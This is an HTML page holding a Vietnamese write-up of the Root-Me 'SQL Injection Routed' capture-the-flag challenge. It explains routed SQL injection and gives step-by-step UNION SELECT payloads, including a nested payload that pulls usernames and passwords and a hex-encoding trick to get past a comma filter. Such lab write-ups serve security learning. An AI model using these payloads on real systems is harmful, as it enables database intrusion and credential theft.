<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-sql1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    SQLi Routed
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Exploit my requests</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Find the admin password.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h2 id="Routed-SQLi"><a href="#Routed-SQLi" class="headerlink" title="Routed SQLi"></a>Routed SQLi</h2>
                <p>Đây là một khái niệm khá dễ nhầm lẫn với các bạn chưa đi sâu vào SQLi.<br>Để hiểu rõ hơn,các bạn nên đọc bài viết tại:<br><a href="http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html" target="_blank" rel="noopener">http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html</a><br>Và làm thực hành tại:<br><a href="http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1" target="_blank" rel="noopener">http://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1</a></p>
                <p>Ví dụ:</p>
                <blockquote>
                    <p>SELECT sec_code FROM sectable WHERE id='$USER_INPUT'</p>
                </blockquote>
                <p>Sau đó,ngta mới dùng cái sec_code tìm được này để hoàn thành câu query tiếp theo lấy thông tin và hiển thị ra website.</p>
                <blockquote>
                    <p>SELECT * FROM products WHERE products_sec_code = sec_code (tìm được)</p>
                </blockquote>
                <p>Do đó,không thể nào dùng câu query đầu tiên làm nơi lấy kết quả được. Ta phải injection điều khiển sec_code theo ý của mình.<br>Để lúc sec_code vào câu query thứ hai, sẽ trả về thuộc tính ta mong muốn của bảng <strong>products</strong>.</p>
                <p>Để phân loại thì Routed SQLi thuộc về <strong>Out of band SQLi</strong> hay <strong>Second Order SQLi</strong>.</p>
                <h2 id="Khai-thac"><a href="#Khai-thac" class="headerlink" title="Khai thác"></a>Khai thác</h2>
                <p>Thử cách chức năng search,ta thấy có nguy cơ dính SQLi.</p>
                <p>Tìm thử với:</p>
                <blockquote>
                    <p>admin</p>
                </blockquote>
                <p>Results<br>[+] Requested login: admin<br>[+] Found ID: 3<br>[+] Email: admin@sqli_me.com</p>
                <p>Thử tìm số cột với ORDER BY nhưng có vẻ nó đã bị filter.<br>Do đó,ta test luôn:</p>
                <blockquote>
                    <p>admin' UNION SELECT 1,2 -- #</p>
                </blockquote>
                <p>Thử với: </p>
                <blockquote>
                    <p>admin' union select 1 -- #</p>
                </blockquote>
                <p>Hình như bị filter dấu , và chỉ có 1 cột duy nhất.<br>Vậy tại sao,nó lại có tận 3 trường thuộc tính trả về là Requested login, Found ID và Email.<br>Như đề bài đã thể hiện rõ, đó là <strong>Routed SQLi</strong>.</p>
                <p>Vậy ta đoán được câu query thứ 1 và thứ 2 sẽ là:</p>
                <blockquote>
                    <p>SELECT ID FROM something_table WHERE username='Cái mà ta nhập vào'<br>SELECT request_login,id,email From users WHERE ID='$ID_TÌM_ĐƯỢC'</p>
                </blockquote>
                <p>Vậy ta cần $ID_TÌM_ĐƯỢC có dạng:</p>
                <blockquote>
                    <p>-1' UNION SELECT username,password FROM users -- #</p>
                </blockquote>
                <p>Vậy ta truyền vào tại username tìm kiếm là:</p>
                <blockquote>
                    <p>asasas' union select -1' UNION SELECT username,password FROM users - #</p>
                </blockquote>
                <p>Cơ mà dấu , đã bị filter nên không thể truyền như vậy được, ta chuyển sang dạng hex để bypass, tức là:</p>
                <blockquote>
                    <p>asasas' union select HEX --#</p>
                </blockquote>
                <p><strong>Lưu ý:</strong> Trong payload HEX có – # và sau đó vẫn phải thêm – # nhé. Vì nó 2 câu truy vấn khác nhau mà.</p>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>